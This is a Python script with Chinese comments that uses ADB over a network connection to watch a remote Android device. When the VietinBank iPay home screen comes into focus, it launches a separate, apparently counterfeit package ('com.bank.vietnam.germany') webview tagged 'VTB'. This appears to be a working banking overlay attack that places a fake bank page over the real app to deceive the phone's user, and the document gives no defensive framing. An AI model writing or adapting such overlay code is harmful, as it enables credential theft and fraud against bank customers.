import subprocess
import threading
import time
import os
import sys

# 全局变量
monitoring = False


def launch_target_activity(device_id):
    """
    启动目标 Activity 并附带参数
    """
    target_activity = "com.bank.vietnam.germany/.Webview"
    extra_key = "web"
    extra_value = "VTB"

    try:
        # 指定设备ID (-s device_id) 运行 ADB 命令
        subprocess.run(
            [
                "adb", "-s", device_id, "shell", "am", "start",
                "-n", target_activity,
                "--es", extra_key, extra_value
            ],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        print(f"✅ 成功启动目标 Activity：{target_activity}，参数：{extra_key}={extra_value}，设备ID：{device_id}")
    except subprocess.CalledProcessError as e:
        print(f"❌ 启动目标 Activity 失败：{e.stderr.decode()}")


def get_current_activity(device_id):
    """通过 ADB 获取当前设备的最后一个活动页面"""
    try:
        result = subprocess.check_output(
            ["adb", "-s", device_id, "shell", "dumpsys", "window"],
            encoding="utf-8",
            errors="ignore"
        )

        last_activity = None  # 用于存储最后一个匹配的 activity
        for line in result.splitlines():
            if "mCurrentFocus" in line or "mFocusedApp" in line:
                parts = line.split()
                for part in parts:
                    if "/" in part:
                        last_activity = part.strip("{}")  # 不直接返回，而是存储最后一个

        return last_activity  # 返回最后一个找到的 activity
    except subprocess.CalledProcessError as e:
        print(f"❌ 获取活动页面时出错: {e}")
        return None


def monitor_activity(target_activity, device_id):
    """持续监控页面"""
    global monitoring
    while True:
        current_activity = get_current_activity(device_id)
        print(f"📌 当前页面: {current_activity}，设备ID: {device_id}")
        if current_activity == target_activity:
            if not monitoring:
                monitoring = True
                print(f"✅ 进入目标页面：{target_activity}")
                launch_target_activity(device_id)
        else:
            if monitoring:
                monitoring = False
                print(f"🚪 离开目标页面：{target_activity}")
                os._exit(0)
        time.sleep(1)


if __name__ == "__main__":


    target_activity = "com.vietinbank.ipay/.activity.HomeActivity"
    activity_thread = threading.Thread(target=monitor_activity, args=(target_activity, "10.147.17.1:45945"), daemon=True)
    activity_thread.start()

    while True:
        time.sleep(1)
